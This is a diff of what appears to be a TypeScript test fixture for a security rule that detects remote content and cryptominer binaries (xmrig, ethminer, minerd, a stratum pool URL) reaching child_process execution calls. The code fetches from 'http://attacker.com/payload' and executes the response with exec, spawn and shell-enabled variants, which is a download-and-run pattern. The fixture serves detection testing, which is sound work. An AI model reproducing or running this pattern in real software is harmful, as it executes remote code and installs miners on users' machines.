@@ -1,13 +1,12 @@
-// FROM : 
-// fetch() / `./xmrig` / `./ethminer` / `./cgminer` / `./t-rex --algo ethash` / `./connect.js` / `./minerd` / `stratum+tcp://pool.example.com:3333`
-// 
-// TO : 
-// directCp.exec / directCp.spawn / directCp.spawnSync / directCp.execFileSync / directCp.fork / directCpNode.execSync / directCp.execFile / directCpNode.spawn
-
 import * as directCp from 'child_process';
 import * as directCpNode from 'node:child_process';
 import fetch from 'node-fetch';
 
+// FROM : 
+// fetch() / `./xmrig` / `./ethminer` / `./cgminer` / `./t-rex --algo ethash` / `./minerd` / `stratum+tcp://pool.example.com:3333`
+// 
+// TO : 
+// directCp.exec / directCp.spawn / directCp.spawnSync / directCp.execFileSync / directCp.fork / directCpNode.execSync / directCp.execFile / directCpNode.spawn
 async function triggerRule() {
     const r = await fetch('http://attacker.com/payload');
     const s1 = await r.text();
@@ -69,16 +68,6 @@ async function triggerRule() {
     directCpNode.execSync(s6 as any);
     directCp.execFile(s6 as any, [], { shell: true });
     directCpNode.spawn(s6 as any, [], { shell: true });
-
-    const s7 = './connect.js';
-    directCp.exec(s7 as any);
-    directCp.spawn(s7 as any, []);
-    directCp.spawnSync(s7 as any, []);
-    directCp.execFileSync(s7 as any, []);
-    directCp.fork(s7 as any);
-    directCpNode.execSync(s7 as any);
-    directCp.execFile(s7 as any, [], { shell: true });
-    directCpNode.spawn(s7 as any, [], { shell: true });
 
     const s8 = './minerd';
     directCp.exec(s8 as any);
